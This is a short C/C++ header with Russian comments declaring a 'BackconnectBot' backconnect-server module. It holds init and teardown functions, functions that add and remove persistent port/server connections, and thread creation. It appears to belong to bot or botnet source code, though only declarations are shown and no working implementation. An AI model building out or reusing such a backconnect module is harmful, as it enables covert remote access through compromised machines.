/*
  Сервер бекконекта.
*/
#pragma once

#if(BO_BCSERVER_PLATFORMS > 0)

#include "..\common\threadsgroup.h"

namespace BackconnectBot
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Добавление постоянного подключения.

    IN servicePort - порт или название сервиса.
    IN server      - сервер.
    IN serverPort  - порт сервера.

    Return         - true - в случаи успеха,
                     false - в случаи ошибки.
  */
  bool _addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);
  
  /*
    Удаление постоянного подключения.

    IN servicePort - порт или название сервиса. Может содержать маски '*' или '?'.
    IN server      - сервер. Может содержать маски '*' или '?'.
    IN serverPort  - порт сервера. Может содержать маски '*' или '?'.

    Return         - true - в случаи успеха,
                     false - в случаи ошибки.
  */
  bool _removeStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);

  /*
    Создание потоков.

    IN OUT group - группа потокок, к которой будут принадлежать потоки сервиса.
    
    Return       - true - в случаи успеха,
                   false - в случаи ошибки.
  */
  bool _create(ThreadsGroup::GROUP *group);
};
#endif
